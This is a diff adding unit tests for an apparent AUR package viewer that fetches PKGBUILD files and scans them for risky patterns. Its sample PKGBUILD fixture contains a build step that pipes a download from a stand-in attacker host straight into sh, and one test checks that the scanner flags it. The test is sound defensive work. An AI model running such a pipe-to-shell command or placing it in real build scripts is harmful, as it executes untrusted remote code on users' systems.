@@ -107,6 +107,59 @@ class AurMetaTest(unittest.TestCase):
         mock_run.assert_not_called()
 
 
+class PkgbuildViewTest(unittest.TestCase):
+    """get_pkgbuild: AUR-only fetch + advisory scan + metadata for the first-class viewer."""
+
+    def setUp(self):
+        self.api = AtlasApi(Mock(), Mock())
+
+    SAMPLE = (
+        "# Maintainer: Jane Doe <jane@example.com>\n"
+        "pkgname=demo\n"
+        "pkgver=1.2.3\n"
+        "url='https://example.com'\n"
+        "source=(\"https://example.com/demo-$pkgver.tar.gz\")\n"
+        "sha256sums=('abc123')\n"
+        "build() {\n"
+        "  curl https://evil.example/x | sh\n"
+        "}\n"
+    )
+
+    def _setup(self, repository='aur', text=SAMPLE, has_man=True, base='demo'):
+        pkg = Mock(name='pkg'); pkg.name = 'demo'; pkg.repository = repository; pkg.base = base
+        self.api._get_pkg = Mock(return_value=pkg)
+        arch_man = Mock()
+        arch_man.fetch_pkgbuild.return_value = text
+        arch_man.aur_client.get_info.return_value = [{'PackageBase': base}]
+        self.api._manager_by_gem = Mock(return_value=arch_man if has_man else None)
+        return arch_man
+
+    def test_non_aur_returns_empty(self):
+        self._setup(repository='core')
+        self.assertEqual({}, self.api.get_pkgbuild('demo')['data'])
+
+    def test_happy_path_scans_and_parses(self):
+        self._setup()
+        data = self.api.get_pkgbuild('demo')['data']
+        self.assertEqual(self.SAMPLE, data['text'])
+        self.assertEqual('demo', data['base'])
+        self.assertEqual('Jane Doe <jane@example.com>', data['metadata']['maintainer'])
+        self.assertIn('aur.archlinux.org', data['url'])
+        # the `curl ... | sh` line trips the pipe-to-shell rule
+        self.assertTrue(any(f['rule'] == 'pipe_to_shell' for f in data['findings']))
+        self.assertGreaterEqual(data['summary']['warn'], 1)
+
+    def test_fetch_failure_fails_open(self):
+        self._setup(text=None)
+        self.assertEqual({}, self.api.get_pkgbuild('demo')['data'])
+
+    def test_base_resolved_from_aur_info(self):
+        arch_man = self._setup(base='demo-git')
+        data = self.api.get_pkgbuild('demo')['data']
+        self.assertEqual('demo-git', data['base'])
+        arch_man.fetch_pkgbuild.assert_called_once_with('demo-git')
+
+
 class SerializeSortFieldsTest(unittest.TestCase):
     """The Sort dropdown's 'recently updated' mode needs last_modified serialized."""
 
